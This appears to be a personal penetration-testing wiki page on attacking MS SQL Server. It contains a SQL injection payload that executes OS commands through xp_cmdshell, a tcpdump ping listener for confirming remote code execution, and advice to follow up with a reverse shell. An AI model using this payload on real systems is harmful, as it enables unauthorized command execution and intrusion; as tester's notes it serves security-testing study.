Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-11-27T18:49:02-05:00

====== MS SQL Server ======
Created Saturday 27 November 2021




===== SQL injection =====
* Try to get command execution (EXEC xp_cmdshell, see below) before doing enumeration.
* Setup a ping listener
{{{code: lang="texinfo" linenumbers="False"
sudo tcpdump -i <if> icmp
}}}

* Then do something like '; EXEC xp_cmdshell 'ping <ip>');--
* If your ping packets come in, you got RCE
* Then try to deploy a reverse shell and call it in a similar fashion

{{./pasted_image.png}}

===== Privileges and DBA account =====
{{./pasted_image001.png}}


{{./pasted_image002.png}}

===== Command exec =====
{{./pasted_image003.png}}

===== SEE =====
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
